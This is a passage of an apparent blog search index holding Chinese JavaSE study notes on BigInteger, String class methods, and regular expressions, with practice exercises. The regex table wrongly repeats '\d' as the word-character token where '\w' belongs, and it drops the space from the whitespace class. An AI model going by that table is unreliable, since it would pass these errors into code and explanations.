align="left">用于实现减法运算</td></tr><tr><td align="left">BigInteger multiply(BigInteger val)</td><td align="left">用于实现乘法运算</td></tr><tr><td align="left">BigInteger divide(BigInteger val)</td><td align="left">用于实现除法运算</td></tr><tr><td align="left">BigInteger remainder(BigInteger val)</td><td align="left">用于实现取余运算</td></tr><tr><td align="left">BigInteger[] divideAndRemainder(BigInteger val)</td><td align="left">用于实现取商和余数的运算</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>String类的概述和使用</title>
      <link href="/2017/05/26/String%E7%B1%BB%E7%9A%84%E6%A6%82%E8%BF%B0%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
      <url>/2017/05/26/String%E7%B1%BB%E7%9A%84%E6%A6%82%E8%BF%B0%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="String类的概念（重点）"><a href="#String类的概念（重点）" class="headerlink" title="String类的概念（重点）"></a>String类的概念（重点）</h2><hr><ul><li>java.lang.String类用于描述字符串，Java程序中所有的字符串字面值都可以使用该类的对象加描 述，如：”abc”。</li><li>该类由ﬁnal关键字修饰，表示该类不能被继承。</li><li>从jdk1.9开始该类的底层不使用char[]来存储数据，而是改成 byte[]加上编码标记，从而节约了一 些空间。</li><li>该类描述的字符串内容是个常量不可更改，因此可以被共享使用。 如：</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> “abc”;   - 其中<span class="string">&quot;abc&quot;</span>这个字符串是个常量不可改变。</span><br><span class="line">str1 = “<span class="number">123</span>”;             - 将“<span class="number">123</span>”字符串的地址赋值给变量str1。 </span><br><span class="line">                          - 改变str1的指向并没有改变指向的内容</span><br></pre></td></tr></table></figure><h2 id="常量池的概念（原理）"><a href="#常量池的概念（原理）" class="headerlink" title="常量池的概念（原理）"></a>常量池的概念（原理）</h2><hr><ul><li>由于String类型描述的字符串内容是常量不可改变，因此Java虚拟机将首次出现的字符串放入常量 池中，若后续代码中出现了相同字符串内容则直接使用池中已有的字符串对象而无需申请内存及创建对象，从而提高了性能。</li></ul><h2 id="常用的构造方法（练熟、记住）"><a href="#常用的构造方法（练熟、记住）" class="headerlink" title="常用的构造方法（练熟、记住）"></a>常用的构造方法（练熟、记住）</h2><hr><table><thead><tr><th align="left">方法声明</th><th align="left">功能介绍</th></tr></thead><tbody><tr><td align="left">String()</td><td align="left">使用无参方式构造对象得到空字符序列</td></tr><tr><td align="left">String(byte[] bytes, int oﬀset, int length)</td><td align="left">使用bytes数组中下标从oﬀset位置开始的length个字节来构造对象</td></tr><tr><td align="left">String(byte[] bytes)</td><td align="left">使用bytes数组中的所有内容构造对象</td></tr><tr><td align="left">String(char[] value, int oﬀset, int count)</td><td align="left">使用value数组中下标从oﬀset位置开始的count个字符来构造对象</td></tr><tr><td align="left">String(char[] value)</td><td align="left">使用value数组中的所有内容构造对象</td></tr><tr><td align="left">String(String original)</td><td align="left">根据参数指定的字符串内容来构造对象，新创建对象为参数对象的副本</td></tr></tbody></table><h2 id="常用的成员方法（练熟、记住）"><a href="#常用的成员方法（练熟、记住）" class="headerlink" title="常用的成员方法（练熟、记住）"></a>常用的成员方法（练熟、记住）</h2><hr><table><thead><tr><th align="left">方法声明</th><th align="left">功能介绍</th></tr></thead><tbody><tr><td align="left">String toString()</td><td align="left">返回字符串本身</td></tr><tr><td align="left">byte[] getBytes()</td><td align="left">将当前字符串内容转换为byte数组并返回</td></tr><tr><td align="left">char[] toCharArray()</td><td align="left">用于将当前字符串内容转换为char数组并返回</td></tr></tbody></table><table><thead><tr><th align="left">方法声明</th><th align="left">功能介绍</th></tr></thead><tbody><tr><td align="left">char charAt(int index)</td><td align="left">方法charAt用于返回字符串指定位置的字符。</td></tr><tr><td align="left">int length()</td><td align="left">返回字符串字符序列的长度</td></tr><tr><td align="left">boolean isEmpty()</td><td align="left">判断字符串是否为空</td></tr></tbody></table><ul><li>案例题目</li><li>判断字符串“上海自来水来自海上”是否为回文并打印，所谓回文是指一个字符序列无论从左向右读 还是从右向左读都是相同的句子。</li></ul><table><thead><tr><th align="left">方法声明</th><th align="left">功能介绍</th></tr></thead><tbody><tr><td align="left">int compareTo(String anotherString)</td><td align="left">用于比较调用对象和参数对象的大小关系</td></tr><tr><td align="left">int compareToIgnoreCase(String str)</td><td align="left">不考虑大小写，也就是’a’和’A’是相等的关系</td></tr></tbody></table><ul><li>案例题目</li><li>编程实现字符串之间大小的比较并打印。</li></ul><table><thead><tr><th align="left">方法声明</th><th align="left">功能介绍</th></tr></thead><tbody><tr><td align="left">String concat(String str)</td><td align="left">用于实现字符串的拼接</td></tr><tr><td align="left">boolean contains(CharSequence s)</td><td align="left">用于判断当前字符串是否包含参数指定的内容</td></tr><tr><td align="left">String toLowerCase()</td><td align="left">返回字符串的小写形式</td></tr><tr><td align="left">String toUpperCase()</td><td align="left">返回字符串的大写形式</td></tr><tr><td align="left">String trim()</td><td align="left">返回去掉前导和后继空白的字符串</td></tr><tr><td align="left">boolean startsWith(String preﬁx)</td><td align="left">判断字符串是否以参数字符串开头</td></tr><tr><td align="left">boolean startsWith(String preﬁx, int toﬀset)</td><td align="left">从指定位置开始是否以参数字符串开头</td></tr><tr><td align="left">boolean endsWith(String suﬃx)</td><td align="left">判断字符串是否以参数字符串结尾</td></tr></tbody></table><ul><li>案例题目</li><li>编程实现上述方法的使用。</li></ul><table><thead><tr><th align="left">方法声明</th><th align="left">功能介绍</th></tr></thead><tbody><tr><td align="left">boolean equals(Object anObject)</td><td align="left">用于比较字符串内容是否相等并返回</td></tr><tr><td align="left">int hashCode()</td><td align="left">获取调用对象的哈希码值</td></tr><tr><td align="left">boolean equalsIgnoreCase(String anotherString)</td><td align="left">用于比较字符串内容是否相等并返回，不考虑大小写， <br/>如：’A’和’a’是相等</td></tr></tbody></table><ul><li>案例题目</li><li>提示用户从键盘输入用户名和密码信息，若输入”admin”和”123456”则提示“登录成功，欢迎使 用”，否则提示“用户名或密码错误，您还有n次机会”，若用户输入三次后依然错误则提示“账户已冻结，请联系客服人员！”</li></ul><table><thead><tr><th align="left">方法声明</th><th align="left">功能介绍</th></tr></thead><tbody><tr><td align="left">int indexOf(int ch)</td><td align="left">用于返回当前字符串中参数ch指定的字符第一次出现的下标</td></tr><tr><td align="left">int indexOf(int ch, int fromIndex)</td><td align="left">用于从fromIndex位置开始查找ch指定的字符</td></tr><tr><td align="left">int indexOf(String str)</td><td align="left">在字符串中检索str返回其第一次出现的位置，若找不到返回-1</td></tr><tr><td align="left">int indexOf(String str, int fromIndex)</td><td align="left">表示从字符串的fromIndex位置开始检索str第一次出现 <br/>的位置</td></tr><tr><td align="left">int lastIndexOf(int ch)</td><td align="left">用于返回参数ch指定的字符最后一次出现的下标</td></tr><tr><td align="left">int lastIndexOf(int ch, int fromIndex)</td><td align="left">用于从fromIndex位置开始查找ch指定字符出现的下标</td></tr><tr><td align="left">int lastIndexOf(String str)</td><td align="left">返回str指定字符串最后一次出现的下标</td></tr><tr><td align="left">int lastIndexOf(String str, int fromIndex)</td><td align="left">用于从fromIndex位置开始反向搜索的第一次出现的下 <br/>标。</td></tr></tbody></table><ul><li>案例题目</li><li>编写通用的代码可以查询字符串”Good Good Study, Day Day Up!”中所有”Day”出现的索引位置并打印出来。</li></ul><table><thead><tr><th align="left">方法声明</th><th align="left">功能介绍</th></tr></thead><tbody><tr><td align="left">String substring(int beginIndex, int endIndex)</td><td align="left">返回字符串中从下标beginIndex（包括）开始到 endIndex（不包括）结束的子字符串</td></tr><tr><td align="left">String substring(int beginIndex)</td><td align="left">返回字符串中从下标beginIndex（包括）开始到字符串结尾的子字符串</td></tr></tbody></table><ul><li>案例题目</li><li>提示用户从键盘输入一个字符串和一个字符，输出该字符(不含)后面的所有子字符串。</li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>正则表达式的概述和使用</title>
      <link href="/2017/05/26/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E6%A6%82%E8%BF%B0%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
      <url>/2017/05/26/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E6%A6%82%E8%BF%B0%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="正则表达式的概念（了解）"><a href="#正则表达式的概念（了解）" class="headerlink" title="正则表达式的概念（了解）"></a>正则表达式的概念（了解）</h2><hr><ul><li>正则表达式本质就是一个“规则字符串”，可以用于对字符串数据的格式进行验证，以及匹配、查 找、替换等操作。该字符串通常使用^运算符作为开头标志，使用$运算符作为结尾标志，当然也可以省略。</li></ul><hr><h2 id="正则表达式的规则（了解）"><a href="#正则表达式的规则（了解）" class="headerlink" title="正则表达式的规则（了解）"></a>正则表达式的规则（了解）</h2><table><thead><tr><th align="left">正则表达式</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">[abc]</td><td align="left">可以出现a、b、c中任意一个字符</td></tr><tr><td align="left">[^abc]</td><td align="left">可以出现任何字符，除了a、b、c的任意字符</td></tr><tr><td align="left">[a-z]</td><td align="left">可以出现a、b、c、……、z中的任意一个字符</td></tr><tr><td align="left">[a-zA-Z0-9]</td><td align="left">可以出现a<del>z、A</del>Z、0~9中任意一个字符</td></tr></tbody></table><table><thead><tr><th align="left">正则表达式</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">.</td><td align="left">任意一个字符（通常不包含换行符）</td></tr><tr><td align="left">\d</td><td align="left">任意一个数字字符，相当于[0-9]</td></tr><tr><td align="left">\D</td><td align="left">任意一个非数字字符</td></tr><tr><td align="left">\s</td><td align="left">空白字符，相当于[\t\n\x0B\f\r]</td></tr><tr><td align="left">\S</td><td align="left">非空白字符</td></tr><tr><td align="left">\d</td><td align="left">任意一个单词字符，相当于[a-zA-Z_0-9]</td></tr><tr><td align="left">\W</td><td align="left">任意一个非单词字符</td></tr></tbody></table><table><thead><tr><th align="left">正则表达式</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">X?</td><td align="left">表示X可以出现一次或一次也没有，也就是0 ~ 1次</td></tr><tr><td align="left">X*</td><td align="left">表示X可以出现零次或多次，也就是0 ~ n次</td></tr><tr><td align="left">X+</td><td align="left">表示X可以出现一次或多次，也就是1 ~ n次</td></tr><tr><td align="left">X{n}</td><td align="left">表示X可以出现恰好 n 次</td></tr><tr><td align="left">X{n，}</td><td align="left">表示X可以出现至少 n 次，也就是&gt;&#x3D;n次</td></tr><tr><td align="left">X{n，m}</td><td align="left">表示X可以出现至少 n 次，但是不超过 m 次，也就是&gt;&#x3D;n并且&lt;&#x3D;m次</td></tr></tbody></table><hr><h2 id="正则表达式相关的方法（熟悉）"><a href="#正则表达式相关的方法（熟悉）" class="headerlink" title="正则表达式相关的方法（熟悉）"></a>正则表达式相关的方法（熟悉）</h2><table><thead><tr><th align="left">方法名称</th><th align="left">方法说明</th></tr></thead><tbody><tr><td align="left">boolean matches(String regex)</td><td align="left">判断当前正在调用的字符串是否匹配参数指定的正则表达式规则</td></tr></tbody></table><ul><li>案例题目</li><li>使用正则表达式描述一下银行卡密码的规则：要求是由6位数字组成。 </li><li>使用正则表达式描述一下QQ号码的规则：要求是由非0开头的5~15位数组成。</li><li>使用正则表达式描述一下手机号码的规则：要求是由1开头，第二位数是3、4、5、7、8中的一位，总共11位。</li><li>描述身份证号码的规则：总共18位，6位数字代表地区，4位数字代表年，2位数字代表月，2位数字代表日期， 3位数字代表个人，最后一位可能数字也可能是X。</li></ul><table><thead><tr><th align="left">方法名称</th><th align="left">方法说明</th></tr></thead><tbody><tr><td align="left">String[] split(String regex)</td><td align="left">参数regex为正则表达式，以regex所表示的字符串为分隔符，将字符串拆分成字符串数组</td></tr><tr><td align="left">String replace(char oldChar, char newChar)</td><td align="left">使用参数newChar替换此字符串中出现的所有参数oldChar</td></tr><tr><td align="left">String replaceFirst(String regex, String replacement)</td><td align="left">替换此字符串匹配给定的正则表达式的第一个子字符串</td></tr><tr><td align="left">String replaceAll(String regex, String replacement)</td><td align="left">将字符串中匹配正则表达式regex的字符串替换成replacement</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaSE </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
